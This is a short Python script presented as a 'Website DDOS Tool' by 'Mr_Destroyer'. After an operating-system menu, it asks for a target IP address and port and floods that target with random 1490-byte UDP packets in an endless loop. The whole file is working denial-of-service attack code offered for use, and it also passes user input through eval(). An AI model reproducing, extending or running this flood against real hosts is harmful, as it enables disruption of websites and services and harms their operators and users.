#python3 
#This tool is Developed By Mohammad Zim
##################################################

#Copyright : Mohammad Zim

###################################################
import socket
import os
import random
import time 
#Banner
print("________________________________________________________________")
print("")
print()
print("               Mr_Destroyer is here                              |")                            
print()
print("               Website DDOS Tool by Mr_Destroyer                 |")               
print()
print()
print("_________________________________________________________________")
print()
print("Choose Your operating system")
print()
print("__________________________________________________________________")
print()
print("[1] Windows ")
print()
print("[2] Linux ")
print()
print("[3] Termux ")
print()
name = input("choose: ")

if(name=="1"):
    os.system("cls")
    print("Ok , you are using windows!")
    print("[+]Starting...")
    time.sleep(4)
elif(name=="2"):
    os.system("clear")
    print("Ok , You are using linux !")
    print("[+]Attack is starting ..")
    time.sleep(4)
elif(name=="3"):
    os.system("clear")
    print("Ok , you are using termux!")
    print("[+]Attack is starting ..")
    time.sleep(4)
else:
    print("[+]Invalid Option!")
    time.sleep(1)




sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1490)


ip = input("Enter The Website ip: ")
port = eval(input("Enter The port: "))
sent = 0

while True:
    sock.sendto(bytes , (ip , port))
    sent = sent+1
    print("Sending %s packet to %s throught port %s " %(sent,ip,port))
